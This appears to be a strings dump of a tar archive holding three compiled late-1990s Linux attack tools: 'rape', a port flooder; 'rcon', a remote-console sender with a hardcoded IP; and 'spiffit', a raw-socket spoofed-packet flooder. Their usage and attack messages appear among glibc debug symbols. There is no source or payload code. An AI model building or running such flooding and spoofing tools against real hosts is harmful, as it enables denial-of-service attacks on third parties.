            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "jaypee.c",
            "_DYNAMIC",
            "host",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "open_sock",
            "spoofedaddr",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/rape",
            "0100755",
            "0000000",
            "0000000",
            "00000031764",
            "07100656664",
            "013032",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "socket",
            "bzero",
            "send",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRhD",
            "fU1fEP",
            "UPEP",
            "\u0403;u[]",
            "1.2.1",
            "Rape.C Version %s, By He||Angel and OseK",
            "12.25.97",
            "Date Released: %s",
            "ViriiTek/bx user",
            "Registered to: %s",
            "Target: %s",
            "Port: %d",
            "Attacking Target... Press CTRL-C to exit.",
            "Unknown Target: %s",
            "Usage: ./rape <target> <port> <times>",
            "Best used on any open port.",
            "Written by He||Angel and OseK",
            "Modified for use with viriitek by Cyranix0r",
            "Release Date: %s VERSION: %s",
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890^[];./",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "rape.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "bcopy@@GLIBC_2.0",
            "echo_connect",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/rcon",
            "0100755",
            "0000000",
            "0000000",
            "00000032014",
            "07100656670",
            "013026",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "bzero",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "bcopy",
            "gethostbyname",
            "sprintf",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "Uu^E",
            "REPEP",
            "1fEP",
            "PEPv ",
            "\u0403;u[]",
            "Unknown address: %s",
            "usage:",
            "\t%s ip command <port>",
            "192.246.40.42",
            "rcon tms ",
            "%s%s",
            "socket",
            "sendto",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "rcon.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "resolve_address",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/spiffit",
            "0100755",
            "0000000",
            "0000000",
            "00000032557",
            "07100656676",
            "013553",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh$",
            "UTWE",
            "fEEE&E",
            "E4EE",
            "1fRp",
            "fE\u0303h",
            "fE\u0383E",
            "EP. }",
            "j&EPEP u",
            "E\ub10dt&",
            "\u0403;u[]",
            "Usage: %s <source> <src_port> <dest> <username> <number_of_packets>",
            "Error: Username is too long",
            "can't resolve source hostname",
            "can't resolve destination hostname",
            "%s@0",
            "socket",
            "setsockopt IP_HDRINCL",
            "Spiffit v1, Flooding: ",
            "sendto",
            " Done!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
